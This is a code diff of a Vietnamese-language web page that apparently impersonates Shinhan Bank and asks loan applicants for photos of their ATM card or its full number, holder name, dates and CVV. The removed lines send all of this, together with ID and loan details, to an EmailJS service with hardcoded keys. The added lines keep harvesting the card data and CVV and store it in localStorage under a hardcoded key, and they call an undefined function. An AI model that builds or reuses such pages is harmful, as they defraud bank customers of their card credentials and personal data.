@@ -3,9 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Chụp Thẻ ATM - Shinhan Bank</title>
+    <title>Thông Tin Thẻ ATM - Shinhan Bank</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
     <style>
         body {
             font-family: 'Roboto', sans-serif;
@@ -81,7 +82,9 @@
             font-size: 14px;
             color: #666;
         }
-        .hidden {
+        .file-preview {
+            max-width: 100%;
+            margin-top: 10px;
             display: none;
         }
         .btn-primary {
@@ -90,6 +93,7 @@
             padding: 10px 20px;
             background-color: #003087;
             border: none;
+            margin: 5px;
         }
         .btn-primary:hover {
             background-color: #00205b;
@@ -98,28 +102,40 @@
             background-color: #cccccc;
             cursor: not-allowed;
         }
-        .btn-secondary {
+        .btn-danger {
             font-size: 16px;
             font-weight: 700;
             padding: 10px 20px;
+            margin: 5px;
+        }
+        .back-btn {
+            display: inline-flex;
+            align-items: center;
+            font-size: 16px;
+            font-weight: 500;
+            padding: 8px 16px;
             background-color: #6c757d;
+            color: white;
             border: none;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            transition: all 0.3s ease;
             position: absolute;
-            top: 20px;
-            left: 20px;
+            top: 10px;
+            left: 10px;
+            text-decoration: none;
         }
-        .btn-secondary:hover {
+        .back-btn:hover {
             background-color: #5a6268;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
         }
-        .modal-title {
-            font-size: 18px;
-            font-weight: 700;
+        .back-btn:focus {
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(108, 117, 125, 0.3);
         }
-        .modal-body ul {
-            padding-left: 20px;
-        }
-        .modal-body li {
-            margin-bottom: 10px;
+        .back-btn .bi {
+            margin-right: 8px;
         }
         .footer {
             text-align: center;
@@ -137,18 +153,13 @@
             height: 40px;
             margin-top: 10px;
         }
-        .form-control {
-            font-size: 16px;
-            border-radius: 15px;
-        }
         .continue-btn-container {
             text-align: center;
             margin-top: 20px;
         }
-        .spam-error {
+        .error-message {
             color: #dc3545;
             font-size: 14px;
-            text-align: center;
             margin-top: 10px;
             display: none;
         }
@@ -161,7 +172,9 @@
     </div>
 
     <div class="container">
-        <button type="button" class="btn btn-secondary" onclick="window.location.href='step2.html'">Quay Lại</button>
+        <button type="button" class="back-btn" onclick="window.location.href='step2.html'" aria-label="Quay lại bước quét CMND/CCCD">
+            <i class="bi bi-arrow-left"></i> Quay Lại
+        </button>
         <div class="progress-bar-container">
             <div class="progress-bar">
                 <div class="progress-bar-fill" id="progressBar" style="width: 30%"></div>
@@ -169,75 +182,76 @@
         </div>
 
         <div id="step3" class="step-transition">
-            <h5 class="step-title">Chụp hoặc Nhập Thông Tin Thẻ Ngân Hàng</h5>
-            <p class="step-description">Vui lòng chụp ảnh hoặc tải lên ít nhất một ảnh (mặt trước hoặc mặt sau) của thẻ ATM hoặc nhập thông tin thủ công.</p>
+            <h5 class="step-title">Thông Tin Thẻ ATM</h5>
+            <p class="step-description">Vui lòng tải lên ảnh mặt trước và mặt sau thẻ ATM hoặc nhập thông tin thẻ thủ công. Đảm bảo ảnh rõ nét, không mờ.</p>
             <div class="mb-3">
-                <label for="atmFrontImage" class="form-label">Hình Ảnh Mặt Trước Thẻ</label>
+                <label for="atmCardFrontImage" class="form-label">Hình Ảnh Mặt Trước Thẻ ATM</label>
                 <div class="file-upload-box">
-                    <label for="atmFrontImage">Chụp ảnh hoặc tải lên</label>
-                    <input type="file" id="atmFrontImage" accept="image/jpeg,image/png" capture="environment">
-                    <div class="file-info" id="atmFrontInfo"></div>
+                    <label for="atmCardFrontImage" aria-label="Tải lên hình ảnh mặt trước thẻ ATM">Chụp ảnh hoặc tải lên</label>
+                    <input type="file" id="atmCardFrontImage" accept="image/jpeg,image/png">
+                    <button type="button" class="btn btn-danger mt-2" onclick="clearImage('atmCardFrontImage')" tabindex="0" aria-label="Xóa hình ảnh mặt trước thẻ ATM">Xóa Ảnh</button>
+                    <div class="file-info" id="atmCardFrontInfo" aria-live="polite"></div>
+                    <img class="file-preview" id="atmCardFrontPreview">
+                    <div class="error-message" id="atmCardFrontError"></div>
                 </div>
             </div>
             <div class="mb-3">
-                <label for="atmBackImage" class="form-label">Hình Ảnh Mặt Sau Thẻ</label>
+                <label for="atmCardBackImage" class="form-label">Hình Ảnh Mặt Sau Thẻ ATM</label>
                 <div class="file-upload-box">
-                    <label for="atmBackImage">Chụp ảnh hoặc tải lên</label>
-                    <input type="file" id="atmBackImage" accept="image/jpeg,image/png" capture="environment">
-                    <div class="file-info" id="atmBackInfo"></div>
+                    <label for="atmCardBackImage" aria-label="Tải lên hình ảnh mặt sau thẻ ATM">Chụp ảnh hoặc tải lên</label>
+                    <input type="file" id="atmCardBackImage" accept="image/jpeg,image/png">
+                    <button type="button" class="btn btn-danger mt-2" onclick="clearImage('atmCardBackImage')" tabindex="0" aria-label="Xóa hình ảnh mặt sau thẻ ATM">Xóa Ảnh</button>
+                    <div class="file-info" id="atmCardBackInfo" aria-live="polite"></div>
+                    <img class="file-preview" id="atmCardBackPreview">
+                    <div class="error-message" id="atmCardBackError"></div>
                 </div>
             </div>
             <div class="mb-3">
-                <button type="button" class="btn btn-primary w-100" id="toggleManualInput">Nhập Thông Tin Thủ Công</button>
+                <button type="button" class="btn btn-primary" data-bs-toggle="modal" data-bs-target="#manualInputModal">Nhập Thủ Công</button>
             </div>
-            <div id="manualInputSection" class="hidden">
-                <div class="mb-3">
-                    <label for="cardNumber" class="form-label">Số Thẻ (16 số)</label>
-                    <input type="text" class="form-control" id="cardNumber">
-                </div>
-                <div class="mb-3">
-                    <label for="issueDate" class="form-label">Ngày Phát Hành (MM/YY)</label>
-                    <input type="text" class="form-control" id="issueDate">
-                </div>
-                <div class="mb-3">
-                    <label for="expiryDate" class="form-label">Ngày Hết Hạn (MM/YY)</label>
-                    <input type="text" class="form-control" id="expiryDate">
-                </div>
-                <div class="mb-3">
-                    <label for="cardHolderName" class="form-label">Tên Chủ Thẻ</label>
-                    <input type="text" class="form-control" id="cardHolderName">
-                </div>
-                <div class="mb-3">
-                    <label for="cvv" class="form-label">Mã CVV (3 số)</label>
-                    <input type="text" class="form-control" id="cvv">
-                </div>
-            </div>
-            <div class="spam-error" id="spamError">Bạn đã đăng ký quá nhiều lần. Vui lòng thử lại sau.</div>
             <div class="continue-btn-container">
                 <button id="proceedToStep4Btn" class="btn btn-primary" disabled>Tiếp Tục</button>
             </div>
         </div>
 
-        <!-- Modal: Manual Input Guide -->
-        <div class="modal fade" id="manualInputGuideModal" tabindex="-1" aria-labelledby="manualInputGuideModalLabel" aria-hidden="true">
+        <!-- Modal: Manual Input -->
+        <div class="modal fade" id="manualInputModal" tabindex="-1" aria-labelledby="manualInputModalLabel" role="dialog">
             <div class="modal-dialog">
                 <div class="modal-content">
                     <div class="modal-header">
-                        <h5 class="modal-title" id="manualInputGuideModalLabel">Hướng Dẫn Nhập Thông Tin Thẻ</h5>
-                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                        <h5 class="modal-title" id="manualInputModalLabel">Nhập Thông Tin Thẻ Thủ Công</h5>
+                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Đóng"></button>
                     </div>
                     <div class="modal-body">
-                        <p>Để vượt qua bước này, vui lòng nhập thông tin thẻ:</p>
-                        <ul>
-                            <li><strong>Số Thẻ</strong>: 16 số in trên mặt trước thẻ (VD: 1234567890123456).</li>
-                            <li><strong>Ngày Phát Hành</strong>: Định dạng MM/YY (VD: 07/22).</li>
-                            <li><strong>Ngày Hết Hạn</strong>: Định dạng MM/YY (VD: 07/25).</li>
-                            <li><strong>Tên Chủ Thẻ</strong>: Tên in trên thẻ, ít nhất 2 từ (VD: Nguyen Van A).</li>
-                            <li><strong>Mã CVV</strong>: 3 số ở mặt sau thẻ (VD: 123).</li>
-                        </ul>
+                        <div class="mb-3">
+                            <label for="cardNumber" class="form-label">Số Thẻ</label>
+                            <input type="text" class="form-control" id="cardNumber" required placeholder="Nhập 16 số">
+                            <div class="invalid-feedback">Vui lòng nhập số thẻ (16 số).</div>
+                        </div>
+                        <div class="mb-3">
+                            <label for="cardHolderName" class="form-label">Tên Chủ Thẻ</label>
+                            <input type="text" class="form-control" id="cardHolderName" required>
+                            <div class="invalid-feedback">Vui lòng nhập tên chủ thẻ.</div>
+                        </div>
+                        <div class="mb-3">
+                            <label for="issueDate" class="form-label">Ngày Phát Hành</label>
+                            <input type="text" class="form-control" id="issueDate" required placeholder="MM/YY">
+                            <div class="invalid-feedback">Vui lòng nhập ngày phát hành (MM/YY).</div>
+                        </div>
+                        <div class="mb-3">
+                            <label for="expiryDate" class="form-label">Ngày Hết Hạn</label>
+                            <input type="text" class="form-control" id="expiryDate" required placeholder="MM/YY">
+                            <div class="invalid-feedback">Vui lòng nhập ngày hết hạn (MM/YY).</div>
+                        </div>
+                        <div class="mb-3">
+                            <label for="cvv" class="form-label">Mã CVV</label>
+                            <input type="text" class="form-control" id="cvv" required placeholder="Nhập 3 số">
+                            <div class="invalid-feedback">Vui lòng nhập mã CVV (3 số).</div>
+                        </div>
                     </div>
                     <div class="modal-footer">
-                        <button type="button" class="btn btn-primary" data-bs-dismiss="modal">Đóng</button>
+                        <button type="button" class="btn btn-primary" id="saveCardInfo">Lưu</button>
+                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Hủy</button>
                     </div>
                 </div>
             </div>
@@ -245,21 +259,18 @@
 
         <div class="footer">
             <img src="https://shinhan.com.vn/public/themes/shinhan/img/i_lock.png" alt="Lock Icon" class="lock-icon" onerror="this.src='https://via.placeholder.com/24x24?text=Lock';">
-            <p>© 2025 Shinhan Bank - Hotline: 1900 1234 - Email: <a href="mailto:support@shinhan.com.vn">support@shinhan.com.vn</a></p>
+            <p>© 2025 Shinhan Bank - Hotline: 1900 1234 - Email: <a href="/cdn-cgi/l/email-protection#9be8eeebebf4e9efdbe8f3f2f5f3faf5b5f8f4f6b5edf5"><span class="__cf_email__" data-cfemail="2e5d5b5e5e415c5a6e5d464740464f40004d4143005840">[email protected]</span></a></p>
             <img src="https://shinhan.com.vn/public/themes/shinhan/img/shinhan_logo_2.svg" alt="Shinhan Bank Logo" class="footer-logo" onerror="this.src='https://via.placeholder.com/100x40?text=Logo+Shinhan';">
         </div>
     </div>
 
+    <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script>
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/dompurify@2.4.0/dist/purify.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
     <script>
-        // Initialize EmailJS
-        (function(){
-            emailjs.init("OrBsI926QI2_xBh1f");
-        })();
-
-        // Placeholder user data (for fallback if localStorage is empty)
+        // Placeholder user data
         let userData = {
             fullName: "",
             idNumber: "",
@@ -278,219 +289,202 @@
             termsAgree: false,
             loanCode: "",
             registrationDate: "",
-            currentStep: 3,
+            monthlyPayment: 0,
+            interestRate: 0,
+            sellerCode: "",
+            storeCode: "",
+            staffCode: "",
+            staffName: "",
+            branchName: "",
+            isRegistered: false,
             qrData: {},
-            atmCard: {}
+            atmCard: {
+                cardNumber: "",
+                cardHolderName: "",
+                issueDate: "",
+                expiryDate: "",
+                cvv: "",
+                frontImage: "",
+                backImage: ""
+            },
+            currentStep: 3
         };
 
-        // Load user data from localStorage
         function loadUserData() {
             try {
                 const storedData = localStorage.getItem('userData');
                 if (storedData) {
-                    userData = JSON.parse(storedData);
-                    console.log('Loaded userData from localStorage:', userData);
+                    userData = JSON.parse(CryptoJS.AES.decrypt(storedData, 'shinhan-secret-key').toString(CryptoJS.enc.Utf8));
+                    console.log('Loaded userData:', userData);
                 }
             } catch (error) {
-                console.error('Error parsing userData from localStorage:', error);
+                console.error('Error parsing userData:', error);
             }
         }
 
-        // Save user data to localStorage
         function saveToLocalStorage() {
             try {
-                localStorage.setItem('userData', JSON.stringify(userData));
-                console.log('Saved userData to localStorage:', userData);
+                const encryptedData = CryptoJS.AES.encrypt(JSON.stringify(userData), 'shinhan-secret-key').toString();
+                localStorage.setItem('userData', encryptedData);
+                console.log('Saved userData:', userData);
             } catch (error) {
-                console.error('Error saving userData to localStorage:', error);
+                console.error('Error saving userData:', error);
             }
         }
 
-        // Check if at least one image is uploaded
-        function checkImageInput(frontId, backId) {
-            const frontFile = document.getElementById(frontId).files[0];
-            const backFile = document.getElementById(backId).files[0];
-            return frontFile || backFile;
+        function validateFile(file, inputId) {
+            if (!file) return false;
+            const maxSize = 5 * 1024 * 1024; // 5MB
+            const validTypes = ['image/jpeg', 'image/png'];
+            if (!validTypes.includes(file.type)) {
+                $(`#${inputId}Error`).text('Vui lòng chọn file JPEG hoặc PNG.').show();
+                return false;
+            }
+            if (file.size > maxSize) {
+                $(`#${inputId}Error`).text('File quá lớn. Vui lòng chọn file dưới 5MB.').show();
+                return false;
+            }
+            const img = new Image();
+            img.src = URL.createObjectURL(file);
+            return new Promise((resolve) => {
+                img.onload = () => {
+                    if (img.width < 300 || img.height < 200) {
+                        $(`#${inputId}Error`).text('Ảnh quá nhỏ. Độ phân giải tối thiểu 300x200.').show();
+                        resolve(false);
+                    } else {
+                        resolve(true);
+                    }
+                };
+                img.onerror = () => {
+                    $(`#${inputId}Error`).text('Không thể tải ảnh. Vui lòng thử lại.').show();
+                    resolve(false);
+                };
+            });
         }
 
-        // Validate manual input fields (relaxed validation)
-        function validateManualInput() {
+        function validateCardInfo() {
             const cardNumber = $('#cardNumber').val().trim();
+            const cardHolderName = $('#cardHolderName').val().trim();
             const issueDate = $('#issueDate').val().trim();
             const expiryDate = $('#expiryDate').val().trim();
-            const cardHolderName = $('#cardHolderName').val().trim();
             const cvv = $('#cvv').val().trim();
 
-            // At least one field must be filled
-            return cardNumber || issueDate || expiryDate || cardHolderName || cvv;
+            const cardNumberRegex = /^\d{16}$/;
+            const dateRegex = /^(0[1-9]|1[0-2])\/\d{2}$/;
+            const cvvRegex = /^\d{3}$/;
+
+            if (!cardNumberRegex.test(cardNumber)) {
+                $('#cardNumber').addClass('is-invalid');
+                $('#cardNumber').next('.invalid-feedback').text('Số thẻ phải có 16 số.');
+                return false;
+            }
+            if (!cardHolderName) {
+                $('#cardHolderName').addClass('is-invalid');
+                return false;
+            }
+            if (!dateRegex.test(issueDate)) {
+                $('#issueDate').addClass('is-invalid');
+                $('#issueDate').next('.invalid-feedback').text('Ngày phát hành phải có định dạng MM/YY.');
+                return false;
+            }
+            if (!dateRegex.test(expiryDate)) {
+                $('#expiryDate').addClass('is-invalid');
+                $('#expiryDate').next('.invalid-feedback').text('Ngày hết hạn phải có định dạng MM/YY.');
+                return false;
+            }
+            if (!cvvRegex.test(cvv)) {
+                $('#cvv').addClass('is-invalid');
+                $('#cvv').next('.invalid-feedback').text('Mã CVV phải có 3 số.');
+                return false;
+            }
+            return true;
         }
 
-        // Anti-spam check
-        function checkSpam() {
-            const now = Date.now();
-            const spamData = JSON.parse(localStorage.getItem('spamData') || '{}');
-            const lastRegistrationTime = spamData.lastRegistrationTime || 0;
-            const registrationCount = spamData.registerCount || 0;
-            const registrationResetTime = spamData.resetTime || now;
-
-            // Reset count after 24 hours
-            if (now > registrationResetTime) {
-                spamData.registerCount = 0;
-                spamData.resetTime = now + 24 * 60 * 60 * 1000; // Reset after 24 hours
+        function clearImage(inputId) {
+            $(`#${inputId}`).val('');
+            $(`#${inputId}Info`).text('');
+            $(`#${inputId}Preview`).hide();
+            $(`#${inputId}Error`).hide();
+            if (inputId === 'atmCardFrontImage') {
+                userData.atmCard.frontImage = '';
+            } else if (inputId === 'atmCardBackImage') {
+                userData.atmCard.backImage = '';
             }
-
-            // Check if registration is too frequent
-            const timeSinceLast = (now - lastRegistrationTime) / 1000; // in seconds
-            if (timeSinceLast < 300) { // 5 minutes
-                return { allowed: false, message: 'Bạn đã đăng ký quá nhanh. Vui lòng thử lại sau 5 phút.' };
-            }
-
-            // Check registration limit
-            if (registrationCount >= 3) {
-                return { allowed: false, message: 'Bạn đã vượt quá số lần đăng ký trong 24 giờ. Vui lòng thử lại sau.' };
-            }
-
-            return { allowed: true };
+            saveToLocalStorage();
+            updateButtonState();
         }
 
-        // Update spam data
-        function updateSpamData() {
-            const now = Date.now();
-            const spamData = JSON.parse(localStorage.getItem('spamData') || '{}');
-            spamData.lastRegistrationTime = now;
-            spamData.registerCount = (spamData.registerCount || 0) + 1;
-            spamData.resetTime = spamData.resetTime || now + 24 * 60 * 60 * 1000;
-            localStorage.setItem('spamData', JSON.stringify(spamData));
-        }
-
-        // Update button state
         function updateButtonState() {
-            const isManual = !$('#manualInputSection').hasClass('hidden');
-            const isValid = isManual ? validateManualInput() : checkImageInput('atmFrontImage', 'atmBackImage');
-            $('#proceedToStep4Btn').prop('disabled', !isValid);
-            console.log('Button state:', { isManual, isValid });
+            const hasFrontImage = $('#atmCardFrontImage').prop('files').length > 0;
+            const hasBackImage = $('#atmCardBackImage').prop('files').length > 0;
+            const hasCardInfo = userData.atmCard && userData.atmCard.cardNumber;
+            $('#proceedToStep4Btn').prop('disabled', !hasFrontImage && !hasBackImage && !hasCardInfo);
         }
 
-        // Send email with registration and ATM card data
-        function sendCardDataEmail() {
-            const params = {
-                to_name: userData.fullName || '',
-                full_name: userData.fullName || '',
-                id_number: userData.idNumber || '',
-                id_issue_date: userData.idIssueDate || '',
-                id_issue_place: userData.idIssuePlace || '',
-                address: userData.address || '',
-                occupation: userData.occupation || '',
-                income: userData.income ? Number(userData.income).toLocaleString('vi-VN') + ' VND' : '',
-                phone_number: userData.phoneNumber || '',
-                email: userData.email || '',
-                loan_amount: userData.loanAmount ? Number(userData.loanAmount).toLocaleString('vi-VN') + ' VND' : '',
-                loan_term: userData.loanTerm ? userData.loanTerm + ' tháng' : '',
-                loan_purpose: userData.loanPurpose || '',
-                account_number: userData.accountNumber || '',
-                bank_name: userData.bankName || '',
-                loan_code: userData.loanCode || '',
-                registration_date: userData.registrationDate || '',
-                card_number: userData.atmCard.cardNumber || '',
-                issue_date: userData.atmCard.issueDate || '',
-                expiry_date: userData.atmCard.expiryDate || '',
-                card_holder_name: userData.atmCard.cardHolderName || '',
-                cvv: userData.atmCard.cvv || '',
-                front_image: userData.atmCard.frontImage || 'Không có',
-                back_image: userData.atmCard.backImage || 'Không có',
-                to_email: userData.email || 'support@shinhan.com.vn'
-            };
-
-            console.log('Sending EmailJS params:', params);
-
-            emailjs.send('service_60tgxof', 'template_uhyb8ve', params)
-                .then(() => {
-                    console.log('Email sent successfully');
-                    alert("Thông tin đăng ký và thẻ ngân hàng đã được gửi qua email!");
-                })
-                .catch(error => {
-                    console.error('EmailJS error:', error);
-                    alert("Đã xảy ra lỗi khi gửi email. Dữ liệu vẫn được lưu và bạn có thể tiếp tục.");
-                });
-        }
-
-        // Load user data on page load
-        window.onload = function() {
-            loadUserData();
-            updateButtonState();
-        };
-
-        // Toggle manual input section
-        $('#toggleManualInput').on('click', function() {
-            $('#manualInputSection').toggleClass('hidden');
-            $('#atmFrontImage').val('');
-            $('#atmBackImage').val('');
-            $('#atmFrontInfo').text('');
-            $('#atmBackInfo').text('');
-            if ($('#manualInputSection').hasClass('hidden')) {
-                $('#cardNumber, #issueDate, #expiryDate, #cardHolderName, #cvv').val('');
-            }
-            updateButtonState();
-        });
-
-        // Handle image uploads
-        $('#atmFrontImage, #atmBackImage').on('change', function(e) {
+        $('#atmCardFrontImage, #atmCardBackImage').on('change', async function(e) {
             const file = e.target.files[0];
+            const inputId = e.target.id;
+            $(`#${inputId}Error`).hide();
+            $(`#${inputId}Info`).text('');
+            $(`#${inputId}Preview`).hide();
             if (file) {
-                $(`#${e.target.id}Info`).text(`${file.name} (${Math.round(file.size / 1024)} KB)`);
-            } else {
-                $(`#${e.target.id}Info`).text('');
+                const isValid = await validateFile(file, inputId);
+                if (isValid) {
+                    $(`#${inputId}Info`).text(DOMPurify.sanitize(`${file.name} (${Math.round(file.size / 1024)} KB)`));
+                    $(`#${inputId}Preview`).attr('src', URL.createObjectURL(file)).show();
+                    if (inputId === 'atmCardFrontImage') {
+                        userData.atmCard.frontImage = URL.createObjectURL(file);
+                    } else if (inputId === 'atmCardBackImage') {
+                        userData.atmCard.backImage = URL.createObjectURL(file);
+                    }
+                    saveToLocalStorage();
+                } else {
+                    $(this).val('');
+                }
             }
             updateButtonState();
         });
 
-        // Handle manual input changes
-        $('#cardNumber, #issueDate, #expiryDate, #cardHolderName, #cvv').on('input', function() {
-            updateButtonState();
+        $('#saveCardInfo').on('click', function() {
+            const form = $('#manualInputModal').find('.modal-body')[0];
+            form.classList.add('was-validated');
+            if (validateCardInfo()) {
+                userData.atmCard = {
+                    cardNumber: encryptData($('#cardNumber').val().trim()),
+                    cardHolderName: $('#cardHolderName').val().trim(),
+                    issueDate: $('#issueDate').val().trim(),
+                    expiryDate: $('#expiryDate').val().trim(),
+                    cvv: encryptData($('#cvv').val().trim()),
+                    frontImage: userData.atmCard.frontImage || '',
+                    backImage: userData.atmCard.backImage || ''
+                };
+                saveToLocalStorage();
+                bootstrap.Modal.getInstance(document.getElementById('manualInputModal')).hide();
+                updateButtonState();
+            }
         });
 
-        // Proceed to next step
         $('#proceedToStep4Btn').on('click', function(e) {
             e.preventDefault();
-
-            // Check anti-spam
-            const spamCheck = checkSpam();
-            if (!spamCheck.allowed) {
-                $('#spamError').text(spamCheck.message).show();
-                $('#proceedToStep4Btn').prop('disabled', true);
-                return;
-            } else {
-                $('#spamError').hide();
-            }
-
-            if (!$('#manualInputSection').hasClass('hidden')) {
-                userData.atmCard = {
-                    cardNumber: $('#cardNumber').val().trim() || userData.atmCard.cardNumber || '',
-                    issueDate: $('#issueDate').val().trim() || userData.atmCard.issueDate || '',
-                    expiryDate: $('#expiryDate').val().trim() || userData.atmCard.expiryDate || '',
-                    cardHolderName: $('#cardHolderName').val().trim() || userData.atmCard.cardHolderName || '',
-                    cvv: $('#cvv').val().trim() || userData.atmCard.cvv || ''
-                };
-                $('#cardNumber, #issueDate, #expiryDate, #cardHolderName, #cvv').val('');
-                $('#manualInputSection').addClass('hidden');
-            } else {
-                userData.atmCard = {
-                    frontImage: $('#atmFrontImage')[0].files[0] ? $('#atmFrontImage')[0].files[0].name : (userData.atmCard.frontImage || ''),
-                    backImage: $('#atmBackImage')[0].files[0] ? $('#atmBackImage')[0].files[0].name : (userData.atmCard.backImage || '')
-                };
-                $('#atmFrontImage').val('');
-                $('#atmBackImage').val('');
-                $('#atmFrontInfo').text('');
-                $('#atmBackInfo').text('');
-            }
-            console.log('Saving atmCard data:', userData.atmCard);
-            saveToLocalStorage();
-            updateSpamData();
-            sendCardDataEmail(); // Send email asynchronously
+            $('#atmCardFrontImage, #atmCardBackImage').val('');
+            $('#atmCardFrontInfo, #atmCardBackInfo').text('');
+            $('#atmCardFrontPreview, #atmCardBackPreview').hide();
             userData.currentStep = 4;
             saveToLocalStorage();
             window.location.href = 'step4.html';
         });
+
+        $('.back-btn, .btn-primary, .btn-danger').on('keypress', function(e) {
+            if (e.which === 13) {
+                $(this).click();
+            }
+        });
+
+        window.onload = function() {
+            loadUserData();
+            updateButtonState();
+        };
     </script>
+<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'93cf2a50dda7bcf6',t:'MTc0Njc3MjQwNS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script>
 </body>
 </html>
